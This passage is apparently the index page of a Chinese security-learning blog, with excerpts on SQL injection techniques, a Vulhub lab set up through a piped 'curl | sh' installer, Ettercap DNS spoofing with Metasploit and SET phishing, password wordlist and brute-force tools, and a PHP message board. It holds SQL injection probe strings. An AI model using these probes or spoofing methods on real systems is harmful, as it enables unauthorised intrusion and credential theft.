<h1 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5. 报错注入"></a>5. 报错注入</h1><h2 id="5-1-extractvalue-参数1，参数2"><a href="#5-1-extractvalue-参数1，参数2" class="headerlink" title="5.1 extractvalue(参数1，参数2)"></a>5.1 extractvalue(参数1，参数2)</h2><h2 id="5-2-updatexml-参数1，参数2，参数3"><a href="#5-2-updatexml-参数1，参数2，参数3" class="headerlink" title="5.2 updatexml(参数1，参数2，参数3)"></a>5.2 updatexml(参数1，参数2，参数3)</h2><h2 id="5-3-floor"><a href="#5-3-floor" class="headerlink" title="5.3 floor()"></a>5.3 floor()</h2><h2 id="5-4-geometrycollection"><a href="#5-4-geometrycollection" class="headerlink" title="5.4 geometrycollection()"></a>5.4 geometrycollection()</h2><h2 id="5-5-NAME-CONST"><a href="#5-5-NAME-CONST" class="headerlink" title="5.5 NAME_CONST()"></a>5.5 NAME_CONST()</h2><h2 id="5-6-join"><a href="#5-6-join" class="headerlink" title="5.6 join"></a>5.6 join</h2><h2 id="5-7-exp"><a href="#5-7-exp" class="headerlink" title="5.7 exp()"></a>5.7 exp()</h2><h2 id="5-8-polygon"><a href="#5-8-polygon" class="headerlink" title="5.8 polygon()"></a>5.8 polygon()</h2><h2 id="5-9-multipoint"><a href="#5-9-multipoint" class="headerlink" title="5.9 multipoint()"></a>5.9 multipoint()</h2><h2 id="5-10-multlinestring"><a href="#5-10-multlinestring" class="headerlink" title="5.10 multlinestring ()"></a>5.10 multlinestring ()</h2><h2 id="5-11-multpolygon"><a href="#5-11-multpolygon" class="headerlink" title="5.11 multpolygon ()"></a>5.11 multpolygon ()</h2><h2 id="5-12-linestring"><a href="#5-12-linestring" class="headerlink" title="5.12 linestring ()"></a>5.12 linestring ()</h2><h1 id="6-伪静态注入"><a href="#6-伪静态注入" class="headerlink" title="6. 伪静态注入"></a>6. 伪静态注入</h1><h1 id="7-宽字节注入"><a href="#7-宽字节注入" class="headerlink" title="7. 宽字节注入"></a>7. 宽字节注入</h1><h2 id="7-5-PDO宽字节注入"><a href="#7-5-PDO宽字节注入" class="headerlink" title="7.5 PDO宽字节注入"></a>7.5 PDO宽字节注入</h2><h3 id="7-5-1-条件"><a href="#7-5-1-条件" class="headerlink" title="7.5.1 条件"></a>7.5.1 条件</h3><h3 id="7-5-2-防御"><a href="#7-5-2-防御" class="headerlink" title="7.5.2 防御"></a>7.5.2 防御</h3><h1 id="8-二次解码注入"><a href="#8-二次解码注入" class="headerlink" title="8. 二次解码注入"></a>8. 二次解码注入</h1><h1 id="9-HTTP头部注入"><a href="#9-HTTP头部注入" class="headerlink" title="9. HTTP头部注入"></a>9. HTTP头部注入</h1><h2 id="9-1-cookie注入"><a href="#9-1-cookie注入" class="headerlink" title="9.1 cookie注入"></a>9.1 cookie注入</h2><h2 id="9-2-XFF注入"><a href="#9-2-XFF注入" class="headerlink" title="9.2 XFF注入"></a>9.2 XFF注入</h2><h1 id="10-二次注入"><a href="#10-二次注入" class="headerlink" title="10.二次注入"></a>10.二次注入</h1><h1 id="11-Tips"><a href="#11-Tips" class="headerlink" title="11. Tips"></a>11. Tips</h1><h2 id="1判断数字型注入还是字符型注入"><a href="#1判断数字型注入还是字符型注入" class="headerlink" title=".1判断数字型注入还是字符型注入"></a>.1判断数字型注入还是字符型注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1 #</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<h1 id="12-参考"><a href="#12-参考" class="headerlink" title="12. 参考"></a>12. 参考</h1>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/09/Vulhub/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/09/Vulhub/" class="post-title-link" itemprop="url">'Vulhub搭建漏洞环境及简单测试'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-09 20:39:11" itemprop="dateCreated datePublished" datetime="2019-04-09T20:39:11+08:00">2019-04-09</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-Vulhub搭建"><a href="#1-Vulhub搭建" class="headerlink" title="1.Vulhub搭建"></a>1.Vulhub搭建</h1><h2 id="1-1-docker安装"><a href="#1-1-docker安装" class="headerlink" title="1.1 docker安装"></a>1.1 docker安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh </span><br><span class="line">docker -h</span><br></pre></td></tr></table></figure>
<p>如果第二个命令能出现docker的帮助提示，则表示安装成功<br>如果提示没有curl，可以按照提示安装curl<br>不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。</p>
<h2 id="1-2-安装docker-compose"><a href="#1-2-安装docker-compose" class="headerlink" title="1.2 安装docker-compose"></a>1.2 安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
<p>第二个命令出现版本信息，表示安装成功。<br>提示没有pip，安装提示安装pip</p>
<h2 id="1-3-安装Vulhub"><a href="#1-3-安装Vulhub" class="headerlink" title="1.3 安装Vulhub"></a>1.3 安装Vulhub</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
<h1 id="2-搭建漏洞环境"><a href="#2-搭建漏洞环境" class="headerlink" title="2.搭建漏洞环境"></a>2.搭建漏洞环境</h1><h2 id="2-1-生成容器"><a href="#2-1-生成容器" class="headerlink" title="2.1 生成容器"></a>2.1 生成容器</h2><p>以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/drupal/CVE-2014-3704# </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/09/Vulhub/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/08/I-Want-to-see-U/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/08/I-Want-to-see-U/" class="post-title-link" itemprop="url">'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-08 19:01:44" itemprop="dateCreated datePublished" datetime="2019-04-08T19:01:44+08:00">2019-04-08</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><h2 id="1-1Ettercap"><a href="#1-1Ettercap" class="headerlink" title="1.1Ettercap"></a>1.1Ettercap</h2><blockquote>
<p>Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。</p>
</blockquote>
<h2 id="1-2MSF模块：browser-autopwn2"><a href="#1-2MSF模块：browser-autopwn2" class="headerlink" title="1.2MSF模块：browser_autopwn2"></a>1.2MSF模块：browser_autopwn2</h2><blockquote>
<p>browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。</p>
</blockquote>
<h1 id="2-实验环境"><a href="#2-实验环境" class="headerlink" title="2.实验环境"></a>2.实验环境</h1><table>
<thead>
<tr>
<th style="text-align:center">角色</th>
<th style="text-align:center">系统版本</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">靶机</td>
<td style="text-align:center">Windows Server 2003</td>
<td style="text-align:center">192.168.126.149</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">攻击机</td>
<td style="text-align:center">Kali Linux 64 bit <strong>2019.1a</strong></td>
<td style="text-align:center">192.168.126.126</td>
<td style="text-align:center">无</td>
</tr>
</tbody>
</table>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/08/I-Want-to-see-U/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/" class="post-title-link" itemprop="url">'使用PHP编写留言板Version2.0'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-29 16:37:23" itemprop="dateCreated datePublished" datetime="2019-03-29T16:37:23+08:00">2019-03-29</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-改进"><a href="#1-改进" class="headerlink" title="1.改进"></a>1.改进</h1><p>在上一篇<a href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">使用PHP编写留言板</a>的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。</p>
<h2 id="1-1删除功能"><a href="#1-1删除功能" class="headerlink" title="1.1删除功能"></a>1.1删除功能</h2><p>新的留言板添加了编辑选项，可以修改留言内容或删除留言。</p>
<h2 id="1-2重复提交"><a href="#1-2重复提交" class="headerlink" title="1.2重复提交"></a>1.2重复提交</h2><p>新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。</p>
<h2 id="1-3时间显示问题"><a href="#1-3时间显示问题" class="headerlink" title="1.3时间显示问题"></a>1.3时间显示问题</h2><p>在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。</p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/26/I-can-not-see-U/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/26/I-can-not-see-U/" class="post-title-link" itemprop="url">'使用Ettercap和SET进行DNS欺骗、钓鱼'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-26 19:51:17" itemprop="dateCreated datePublished" datetime="2019-03-26T19:51:17+08:00">2019-03-26</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><h2 id="1-1Ettercap"><a href="#1-1Ettercap" class="headerlink" title="1.1Ettercap"></a>1.1Ettercap</h2><blockquote>
<p>Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.</p>
</blockquote>
<h2 id="1-2SET-Socail-Engineering-Toolkit"><a href="#1-2SET-Socail-Engineering-Toolkit" class="headerlink" title="1.2SET(Socail-Engineering-Toolkit)"></a>1.2SET(Socail-Engineering-Toolkit)</h2><blockquote>
<p>Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。</p>
</blockquote>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/26/I-can-not-see-U/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/25/Generate-Social-Engineering-Wordlist/" class="post-title-link" itemprop="url">'生成社工字典'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-25 20:10:41" itemprop="dateCreated datePublished" datetime="2019-03-25T20:10:41+08:00">2019-03-25</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><p>两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。<br>cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。</p>
<h2 id="1-1pydictory"><a href="#1-1pydictory" class="headerlink" title="1.1pydictory"></a>1.1pydictory</h2><blockquote>
<p>你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；<br>你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,<br>除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作；</p>
<p>你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、<br>各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改<br>/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。<br>生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系；</p>
</blockquote>
<h2 id="1-2cupper"><a href="#1-2cupper" class="headerlink" title="1.2cupper"></a>1.2cupper</h2><blockquote>
<p>cupper可以实现的功能如下：</p>
<ul>
<li>根据目标的信息，生成目标可能使用的密码列表（核心功能）</li>
<li>对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率</li>
<li>下载作者提供的常用密码字典</li>
</ul>
</blockquote>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/25/Generate-Social-Engineering-Wordlist/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/24/Create-Message-Board-with-PHP/" class="post-title-link" itemprop="url">'使用PHP编写留言板'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-24 15:36:54" itemprop="dateCreated datePublished" datetime="2019-03-24T15:36:54+08:00">2019-03-24</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="PHP留言板结构"><a href="#PHP留言板结构" class="headerlink" title="PHP留言板结构"></a>PHP留言板结构</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/01.Structure.png">
<h1 id="1-新建Message类"><a href="#1-新建Message类" class="headerlink" title="1.新建Message类"></a>1.新建Message类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Message&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $time;</span><br><span class="line">	public $content;</span><br><span class="line"></span><br><span class="line">	function __construct($n,$t,$c)&#123;</span><br><span class="line">		$this-&gt;name=$n;</span><br><span class="line">		$this-&gt;time=$t;</span><br><span class="line">		$this-&gt;content=$c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function show()&#123;</span><br><span class="line">		echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。<br>在创建对象时，构造函数使将值赋给对象的3个属性。<br>show()方法则是显示留言内容。</p>
<h1 id="2-新建MessageBoard类"><a href="#2-新建MessageBoard类" class="headerlink" title="2.新建MessageBoard类"></a>2.新建MessageBoard类</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/02.MessageBoard.png">
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/24/Create-Message-Board-with-PHP/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/" class="post-title-link" itemprop="url">'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-21 19:49:19" itemprop="dateCreated datePublished" datetime="2019-03-21T19:49:19+08:00">2019-03-21</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-shellinabox介绍"><a href="#1-shellinabox介绍" class="headerlink" title="1.shellinabox介绍"></a>1.shellinabox介绍</h1><p>Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>，在启用了SSL/TLS证书，需要用<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>来登录。默认情况下shellinabox使用的是4200端口。</p>
<h1 id="2-shellinabox安装"><a href="#2-shellinabox安装" class="headerlink" title="2.shellinabox安装"></a>2.shellinabox安装</h1><p>使用的是系统是Kali Linux 2019，在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install shellinabox</span><br></pre></td></tr></table></figure>
<p>如果提示无法找到包，请添加国内更新源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br><span class="line">//添加下列更新源</span><br><span class="line">#清华大学 [更新源]</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"></span><br><span class="line">#浙江大学[更新源]</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/18/Brief-Introduction-on-Medusa&Hydra/" class="post-title-link" itemprop="url">'Medusa和Hydra对比'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-18 19:51:27" itemprop="dateCreated datePublished" datetime="2019-03-18T19:51:27+08:00">2019-03-18</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><h2 id="1-1Hydra"><a href="#1-1Hydra" class="headerlink" title="1.1Hydra"></a>1.1Hydra</h2><blockquote>
<p>Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.</p>
<p>THIS TOOL IS FOR LEGAL PURPOSES ONLY!</p>
<p><strong>There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects.</strong></p>
<p>It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS.</p>
<p>Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p>
<p>However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-)</p>
</blockquote>
<h2 id="1-2Medusa"><a href="#1-2Medusa" class="headerlink" title="1.2Medusa"></a>1.2Medusa</h2><blockquote>
